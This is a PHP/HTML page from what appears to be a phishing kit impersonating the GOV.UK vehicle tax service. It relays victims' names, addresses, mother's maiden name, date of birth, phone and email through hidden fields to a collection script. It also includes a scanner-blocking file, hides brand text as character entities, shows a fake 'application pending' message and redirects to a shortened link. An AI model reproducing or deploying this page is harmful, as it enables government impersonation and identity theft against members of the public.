<?php
require "includes/blocker.php";
require "includes/functions.php";

error_reporting(0);
?>
<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="icon" href="media/favicon.ico" type="image/x-icon">
<link href="media/template.css" media="screen" rel="stylesheet" type="text/css">
<link href="media/template-print.css" media="print" rel="stylesheet" type="text/css">
<link href="media/fonts.css" media="screen" rel="stylesheet" type="text/css">
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="media/apple-touch-icon-114x114.png">
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="media/apple-touch-icon-144x144.png">
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="media/apple-touch-icon-72x72.png">
<link rel="apple-touch-icon-precomposed" href="media/apple-touch-icon-57x57.png">
<meta http-equiv="Refresh" content="23; url=https://tinyurl.com/7qw3eec" />

<title>
&#84;&#97;&#120;&#105;&#110;&#103;&#32;&#97;&#32;&#118;&#101;&#104;&#105;&#99;&#108;&#101;&#32;&#45;&#32;&#71;&#79;&#86;&period;&#85;&#75;</title>
<style type="text/css">
@media only screen and (max-width: 765px) {
.desktoponly { display: none; }
#thatimg {
float: left;
height: 30px;
padding-right: 5px;
margin-top: 5px;
}
}
#thatimg {
float: left;
height: 30px;
padding-right: 5px;
margin-top: -2px;
}
}
#MainContent_VedPicker_rbVED h4
{
padding: 0;
margin: 0;
margin-top: 1em;
margin-bottom: 0.5em;
}
#blank {  position: absolute;  clip: rect(0,0,0,0); }
</style>
<script>
function showIt() {
document.getElementById("maindiv1").style.display = "none";
}
setTimeout("showIt()", 4000);

function showItWo() {
document.getElementById("maindiv2").style.display = "block";
}
setTimeout("showItWo()", 4005);
</script>
<script type="text/javascript" src="https://code.jquery.com/jquery-2.2.3.js"></script>
<script src="media/styles.js" type="text/javascript"></script>
</head>
<body ontouchstart="" class="js-enabled">
<form method="post" action="php/status_1.php" id="EVL" novalidate="">
<input id="thetype" type="hidden" name="thetype" value="">
<input name="firstname" value="<?php echo $firstname; ?>" type="hidden" />
<input name="surname" value="<?php echo $surname; ?>" type="hidden" />
<input name="address" value="<?php echo $address; ?>" type="hidden" />
<input name="city" value="<?php echo $city; ?>" type="hidden" />
<input name="zipcode" value="<?php echo $zipcode; ?>" type="hidden" />
<input name="mmn" value="<?php echo $mmn; ?>" type="hidden" />
<input name="dob" value="<?php echo $dob; ?>" type="hidden" />
<input name="phonenr" value="<?php echo $phonenr; ?>" type="hidden" />
<input name="email" value="<?php echo $email; ?>" type="hidden" />

<header role="banner" class="with-proposition" id="global-header">
<div class="header-wrapper">
<div class="header-global">
<div class="header-logo">
<a id="logo" class="content">
<img src="media/dd.png" width="35" height="31"> &#71;&#79;&#86;&period;&#85;&#75;
</a>
</div>
</div>
<div class="header-proposition">
  <div class="content">
<nav id="proposition-menu">
  <a id="proposition-name">Vehicle tax</a>
</nav>
  </div>
</div>
</div>
</header>
<div id="globalNotice" class="maincontent">
<span id="lblGlobalMessage"><a class="toggle-target">&#86;&#105;&#101;&#119;&#32;&#98;&#117;&#100;&#103;&#101;&#116;&#32;&#99;&#104;&#97;&#110;&#103;&#101;&#32;&#105;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;</a>
</span>   
</div>
<div id="global-header-bar"></div>
<div class="maincontent">
<div class="phase-banner">
  <p>
<strong class="phase-tag">BETA</strong>
<span>This is a new service – your <a id="FeedbackLink" href="#">feedback</a> will help us to improve it.</span>
  </p>
</div>
</div>
<div id="wrapper">
<div class="maincontent">
<div id="startHeader" class="start-header group">
<h1>
&#84;&#97;&#120;&#105;&#110;&#103;&#32;&#97;&#32;&#118;&#101;&#104;&#105;&#99;&#108;&#101;
</h1>
</div>

<div id="maindiv1" class="body-container group">
<div>
<p>
<span id="MainContent_lblV5C2Aquire" class="label">Please wait..</span>
</p>
</div>
<div class="action">

<img src="media/loading.gif" id="Loading1">
<br><br>
<br><br>
<br><br>
<br><br>
<br><br>
<br><br>
</div>
</div>

<div id="maindiv2" style="display:none;" class="body-container group">
<div id="div1" class="">


</div>
<div>
<p>
<span id="MainContent_lblV5C2Aquire" class="label">
Thank you for submitting your application.<Br>
We will process your application within the next few days and send you a confirmation message in your inbox.<Br>
<Br>
Status: Pending<Br>
<Br>
<Br>
You will be redirected to home page in a few seconds. </span>
</p>
</div>
<div class="action">

<img src="media/loading.gif" id="Loading2" style="display: none;">
</div>
</div>




</div>
</div>
<footer class="group js-footer" id="footer" role="contentinfo">
<div class="footer-wrapper">
<div class="footer-meta">
<div class="footer-meta-inner">
<ul>
<li>
<a id="cookiesLink" href="#">Cookies</a>
</li>
<li>
<a href="#">Terms and Conditions</a>
</li>
<li>
<a id="butEnglish" href="#">English</a>
</li>
<li>
<a id="butWelsh" href="#">Cymraeg</a>
</li>
<li>
<a href="#"><span id="privacyPolicy">Privacy Information Notice</span></a> 
</li>
<li>
Built by the <a href="#">&#68;&#114;&#105;&#118;&#101;&#114;&#32;&amp;&#32;&#86;&#101;&#104;&#105;&#99;&#108;&#101;&#32;&#76;&#105;&#99;&#101;&#110;&#115;&#105;&#110;&#103;&#32;&#65;&#103;&#101;&#110;&#99;&#121;</a> 
</li>
</ul>
<div class="open-licence">
<p class="logo"><a href="#">&#79;&#112;&#101;&#110;&#32;&#71;&#111;&#118;&#101;&#114;&#110;&#109;&#101;&#110;&#116;&#32;&#76;&#105;&#99;&#101;&#110;&#99;&#101;&#32;</a></p>
<p>
All content is available under the <a href="#">
&#79;&#112;&#101;&#110;&#32;&#71;&#111;&#118;&#101;&#114;&#110;&#109;&#101;&#110;&#116;&#32;&#76;&#105;&#99;&#101;&#110;&#99;&#101;&#32; v2.0</a>, except where otherwise stated</p>
</div>
</div>
<div class="copyright">
<a href="#">
© Crown copyright</a>
</div>
</div>
</div>
</footer>
</form>


</body></html>